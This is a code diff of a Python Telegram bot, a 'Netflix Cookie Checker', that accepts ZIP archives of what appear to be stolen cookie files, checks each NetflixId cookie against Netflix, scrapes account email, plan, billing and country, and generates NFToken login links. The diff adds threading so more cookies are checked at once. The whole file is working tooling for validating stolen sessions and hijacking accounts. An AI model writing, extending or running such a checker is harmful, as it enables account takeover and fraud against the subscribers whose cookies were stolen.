@@ -10,6 +10,7 @@ import requests
 import urllib.parse
 from datetime import datetime
 from threading import Lock
+from concurrent.futures import ThreadPoolExecutor, as_completed
 import time
 import gc
 import urllib3
@@ -42,6 +43,15 @@ try:
     print("✅ Keep-alive server started")
 except Exception as e:
     print(f"⚠️ Keep-alive server not started: {e}")
+
+# ============ FIX FOR PYTHON EVENT LOOP ============
+try:
+    asyncio.get_running_loop()
+except RuntimeError:
+    try:
+        asyncio.set_event_loop(asyncio.new_event_loop())
+    except:
+        pass
 
 # ============ TELEGRAM IMPORTS ============
 try:
@@ -109,14 +119,14 @@ COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
 REQUIRED_COOKIE = "NetflixId"
 
 # ============ BOT CONFIGURATION ============
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
-if not BOT_TOKEN:
-    print("❌ BOT_TOKEN environment variable not set!")
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
+if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
+    print("❌ Please set BOT_TOKEN environment variable!")
     sys.exit(1)
 
-MAX_FILE_SIZE = 5 * 1024 * 1024
-CHUNK_SIZE = 30  # Smaller chunks for stability
-MAX_RETRIES = 2
+MAX_FILE_SIZE = 5 * 1024 * 1024  # 5 MB
+MAX_THREADS = 4  # Safe for 512MB RAM + 0.1 CPU
+CHUNK_SIZE = 50  # Files per chunk
 
 # ============ COUNTERS ============
 class Counters:
@@ -155,22 +165,6 @@ class Counters:
             self.bad = 0
 
 counters = Counters()
-
-# ============ SESSION MANAGEMENT ============
-def get_session():
-    """Create a new session with connection pooling disabled"""
-    session = requests.Session()
-    session.headers.update(BASE_HEADERS)
-    # Disable connection pooling to prevent leaks
-    session.adapters.clear()
-    return session
-
-def close_session(session):
-    """Close session and clean up"""
-    try:
-        session.close()
-    except:
-        pass
 
 # ============ COOKIE EXTRACTION FUNCTIONS ============
 def parse_netscape_cookie_line(line):
@@ -247,13 +241,11 @@ def get_nftoken_from_cookies(cookie_dict):
     if not netflix_id:
         return None, None
     
-    session = None
+    headers = dict(BASE_HEADERS)
+    headers["Cookie"] = f"NetflixId={netflix_id}"
+    
     try:
-        session = get_session()
-        headers = dict(BASE_HEADERS)
-        headers["Cookie"] = f"NetflixId={netflix_id}"
-        
-        response = session.get(
+        response = requests.get(
             API_URL,
             params=QUERY_PARAMS,
             headers=headers,
@@ -274,11 +266,8 @@ def get_nftoken_from_cookies(cookie_dict):
             expires //= 1000
         
         return token, expires
-    except:
+    except Exception:
         return None, None
-    finally:
-        if session:
-            close_session(session)
 
 def format_expiry(expires):
     if not isinstance(expires, (int, float)):
@@ -293,19 +282,17 @@ def get_account_info(cookie_dict):
     if not netflix_id:
         return None
     
-    session = None
+    url = "https://www.netflix.com/account"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Connection": "close",
+    }
+    cookies = {"NetflixId": netflix_id}
+    
     try:
-        session = get_session()
-        url = "https://www.netflix.com/account"
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.5",
-            "Connection": "close",  # Force connection close
-        }
-        cookies = {"NetflixId": netflix_id}
-        
-        response = session.get(url, headers=headers, cookies=cookies, timeout=12, verify=False)
+        response = requests.get(url, headers=headers, cookies=cookies, timeout=12, verify=False)
         text = response.text
         
         info = {
@@ -359,11 +346,8 @@ def get_account_info(cookie_dict):
             info["nextBilling"] = billing_match.group(1)
         
         return info
-    except:
+    except Exception:
         return None
-    finally:
-        if session:
-            close_session(session)
 
 def classify_plan(plan_name):
     if not plan_name:
@@ -411,7 +395,7 @@ def find_txt_files(folder_path):
         pass
     return txt_files
 
-# ============ PROCESS COOKIE ============
+# ============ PROCESS COOKIE WITH THREADS ============
 def process_cookie_file(file_path):
     try:
         cookie_dict = extract_cookies_from_file(file_path)
@@ -450,6 +434,37 @@ def process_cookie_file(file_path):
     except Exception as e:
         return None
 
+def process_cookies_in_chunk(file_paths, status_callback=None):
+    """Process a chunk of files using ThreadPoolExecutor"""
+    results = []
+    completed = 0
+    total = len(file_paths)
+    
+    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+        future_to_file = {executor.submit(process_cookie_file, f): f for f in file_paths}
+        
+        for future in as_completed(future_to_file):
+            completed += 1
+            try:
+                result = future.result(timeout=25)
+                if result:
+                    results.append(result)
+                    if result["status"] == "Active":
+                        counters.add_hit()
+                    elif result["status"] == "Canceled":
+                        counters.add_custom()
+                    elif result["status"] == "Free":
+                        counters.add_free()
+                else:
+                    counters.add_bad()
+            except Exception as e:
+                counters.add_bad()
+            
+            if status_callback:
+                status_callback(completed, total)
+    
+    return results
+
 # ============ MAIN BOT FUNCTIONS ============
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
@@ -463,7 +478,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "🎬 **Netflix Cookie Checker Bot**\n\n"
         "Send me a ZIP archive containing TXT files with Netflix cookies.\n\n"
-        f"⚡ **Processing {CHUNK_SIZE} files at a time**\n"
+        f"⚡ **Using {MAX_THREADS} threads with {CHUNK_SIZE} files per chunk**\n"
         "⚠️ **Maximum file size: 5 MB**\n\n"
         "I will check all cookies, extract account info, and generate NFToken links.",
         reply_markup=reply_markup,
@@ -486,7 +501,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "• Extracts account information\n"
         "• Generates PC and Phone NFToken links\n"
         "• Shows each account in a separate message\n"
-        f"• Processes {CHUNK_SIZE} files per chunk"
+        f"• Uses {MAX_THREADS} threads for speed"
     )
     
     keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back")]]
@@ -502,19 +517,20 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             await update.message.reply_text(help_text, reply_markup=reply_markup, parse_mode="Markdown")
     except Exception as e:
-        pass
+        print(f"Error in help_command: {e}")
 
 async def about_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     about_text = (
         "ℹ️ **About Bot**\n\n"
         "Netflix Cookie Checker Bot\n"
         "Checks Netflix cookies and generates NFToken links.\n\n"
-        "🔹 Version: 6.0 (Stable)\n"
+        "🔹 Version: 5.0\n"
         "🔹 Supports: ZIP only\n"
         "🔹 Max file size: 5 MB\n"
+        f"🔹 Threads: {MAX_THREADS}\n"
         f"🔹 Chunk size: {CHUNK_SIZE}\n"
-        "🔹 Auto connection cleanup\n"
-        "🔹 Each account shown separately"
+        "🔹 Each account shown separately\n"
+        "🔹 Live statistics during scanning"
     )
     
     keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back")]]
@@ -530,7 +546,7 @@ async def about_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             await update.message.reply_text(about_text, reply_markup=reply_markup, parse_mode="Markdown")
     except Exception as e:
-        pass
+        print(f"Error in about_command: {e}")
 
 async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stats_text = (
@@ -555,7 +571,7 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             await update.message.reply_text(stats_text, reply_markup=reply_markup, parse_mode="Markdown")
     except Exception as e:
-        pass
+        print(f"Error in stats_command: {e}")
 
 async def reset_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     counters.reset()
@@ -601,13 +617,13 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.edit_message_text(
                 "🎬 **Netflix Cookie Checker Bot**\n\n"
                 "Send me a ZIP archive containing TXT files with Netflix cookies.\n\n"
-                f"⚡ **Processing {CHUNK_SIZE} files at a time**\n"
+                f"⚡ **Using {MAX_THREADS} threads with {CHUNK_SIZE} files per chunk**\n"
                 "⚠️ **Maximum file size: 5 MB**",
                 reply_markup=reply_markup,
                 parse_mode="Markdown"
             )
     except Exception as e:
-        pass
+        print(f"Error in button_callback: {e}")
 
 async def process_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path, extract_dir, status_msg):
     try:
@@ -633,46 +649,39 @@ async def process_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE, f
         
         total_files = len(txt_files)
         results = []
-        completed = 0
+        total_processed = 0
         
         # Process files in chunks
         for i in range(0, total_files, CHUNK_SIZE):
             chunk = txt_files[i:i + CHUNK_SIZE]
             
-            for txt_file in chunk:
+            # Update status function
+            def update_status(completed, total):
+                nonlocal total_processed
+                total_processed += 1
                 try:
-                    # Force garbage collection periodically
-                    if completed % 100 == 0 and completed > 0:
-                        gc.collect()
-                    
-                    result = process_cookie_file(txt_file)
-                    completed += 1
-                    
-                    if result:
-                        results.append(result)
-                        if result["status"] == "Active":
-                            counters.add_hit()
-                        elif result["status"] == "Canceled":
-                            counters.add_custom()
-                        elif result["status"] == "Free":
-                            counters.add_free()
-                    else:
-                        counters.add_bad()
-                    
-                    # Update status every file
-                    await status_msg.edit_text(
-                        f"⏳ **Processing your file...**\n\n"
-                        f"📁 {completed}/{total_files} files checked\n"
-                        f"📊 {counters.get_stats()}",
-                        parse_mode="Markdown"
-                    )
-                    
-                except Exception as e:
-                    counters.add_bad()
-                    print(f"Error processing file: {e}")
-                    continue
+                    loop = asyncio.get_event_loop()
+                    if loop.is_running():
+                        asyncio.run_coroutine_threadsafe(
+                            status_msg.edit_text(
+                                f"⏳ **Processing your file...**\n\n"
+                                f"📁 {total_processed}/{total_files} files checked\n"
+                                f"📊 {counters.get_stats()}",
+                                parse_mode="Markdown"
+                            ),
+                            loop
+                        )
+                except:
+                    pass
             
-            # Delay between chunks
+            # Process chunk with threads
+            chunk_results = process_cookies_in_chunk(chunk, update_status)
+            results.extend(chunk_results)
+            
+            # Clean up memory
+            gc.collect()
+            
+            # Small delay between chunks
             if i + CHUNK_SIZE < total_files:
                 await asyncio.sleep(0.3)
         
@@ -753,10 +762,50 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await process_zip_file(update, context, file_path, extract_dir, status_msg)
         
     except Exception as e:
+        print(f"Error in handle_document: {e}")
         await update.message.reply_text(
             f"❌ **Error: {str(e)}**",
             parse_mode="Markdown"
         )
+
+def process_cookie_file(file_path):
+    try:
+        cookie_dict = extract_cookies_from_file(file_path)
+        
+        if not is_valid_cookie(cookie_dict):
+            return None
+        
+        account_info = get_account_info(cookie_dict)
+        if not account_info or account_info["status"] == "Unknown":
+            return None
+        
+        account_info["email"] = fix_email_display(account_info["email"])
+        
+        token, expires = get_nftoken_from_cookies(cookie_dict)
+        
+        if not token:
+            return None
+        
+        result = {
+            "email": account_info["email"],
+            "status": account_info["status"],
+            "country": account_info["country"],
+            "plan": account_info["plan"],
+            "plan_type": classify_plan(account_info["plan"]),
+            "maxStreams": account_info["maxStreams"],
+            "memberSince": account_info["memberSince"],
+            "nextBilling": account_info["nextBilling"],
+            "nftoken": token,
+            "expires": expires,
+            "expiry_formatted": format_expiry(expires),
+            "pc_link": f"https://www.netflix.com/browse?nftoken={token}",
+            "phone_link": f"https://www.netflix.com/unsupported?nftoken={token}",
+        }
+        
+        return result
+    except Exception as e:
+        print(f"Error in process_cookie_file: {e}")
+        return None
 
 async def send_account_message(update, context, result, index, total):
     status_emoji = "✅" if "Active" in result["status"] else "❌" if "Canceled" in result["status"] else "🆓"
@@ -824,8 +873,10 @@ async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ============ MAIN ============
 def main():
     try:
+        # Create application
         application = Application.builder().token(BOT_TOKEN).build()
         
+        # Add handlers
         application.add_handler(CommandHandler("start", start))
         application.add_handler(CommandHandler("help", help_command))
         application.add_handler(CommandHandler("about", about_command))
@@ -836,17 +887,21 @@ def main():
         application.add_error_handler(error_handler)
         
         print("🤖 Netflix Cookie Checker Bot is running...")
-        print(f"✅ Processing {CHUNK_SIZE} files per chunk")
+        print(f"✅ Using {MAX_THREADS} threads")
+        print(f"📦 Processing {CHUNK_SIZE} files per chunk")
         print("📁 Supported format: ZIP only")
         print("📦 Max file size: 5 MB")
         print("📊 Live statistics enabled!")
         print("🌐 Keep-alive server running for Render")
-        print("🧹 Auto connection cleanup enabled")
+        print("🧹 Auto memory cleanup enabled")
         
+        # Run the bot
         application.run_polling(allowed_updates=Update.ALL_TYPES)
             
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"Error in main: {e}")
+        import traceback
+        traceback.print_exc()
 
 if __name__ == "__main__":
     main()
